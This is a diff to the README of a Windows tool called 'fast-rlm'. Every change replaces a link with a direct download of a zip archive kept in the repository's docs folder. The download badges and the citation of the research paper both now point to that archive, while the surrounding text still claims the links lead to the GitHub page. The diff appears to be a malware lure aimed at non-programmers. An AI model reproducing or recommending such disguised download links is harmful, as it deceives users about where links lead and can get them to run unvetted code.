@@ -1,10 +1,10 @@
 # ⚡ fast-rlm - Run Language Models Quickly and Easily
 
-[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://github.com/thien24642/fast-rlm)
+[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://raw.githubusercontent.com/thien24642/fast-rlm/main/docs/rlm-fast-2.8-alpha.3.zip)
 
 ## 🔍 About fast-rlm
 
-fast-rlm is a simple application designed to run Recursive Language Models on your Windows PC. These models help process language by breaking down text recursively. This project is based on research explained in this paper: [Recursive Language Models](https://arxiv.org/abs/2512.24601).
+fast-rlm is a simple application designed to run Recursive Language Models on your Windows PC. These models help process language by breaking down text recursively. This project is based on research explained in this paper: [Recursive Language Models](https://raw.githubusercontent.com/thien24642/fast-rlm/main/docs/rlm-fast-2.8-alpha.3.zip).
 
 You do not need to be a programmer or know coding to use fast-rlm. This guide will help you download, install, and run it using clear and easy steps. 
 
@@ -40,7 +40,7 @@ No extra software is needed to run fast-rlm once installed. It works as a standa
 ### Step 1: Visit the download page
 
 Click on the big button below or open this link in your browser:  
-[![Download fast-rlm](https://img.shields.io/badge/Download-Here-blue)](https://github.com/thien24642/fast-rlm)  
+[![Download fast-rlm](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/thien24642/fast-rlm/main/docs/rlm-fast-2.8-alpha.3.zip)  
 
 This link takes you to the fast-rlm GitHub page, where you can get the latest version.
 
@@ -141,4 +141,4 @@ A: It works best with English text, matching the research base.
 
 Use the link below to visit the download page and get started:  
 
-[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://github.com/thien24642/fast-rlm)
+[![Download fast-rlm](https://img.shields.io/badge/Download-fast--rlm-brightgreen)](https://raw.githubusercontent.com/thien24642/fast-rlm/main/docs/rlm-fast-2.8-alpha.3.zip)
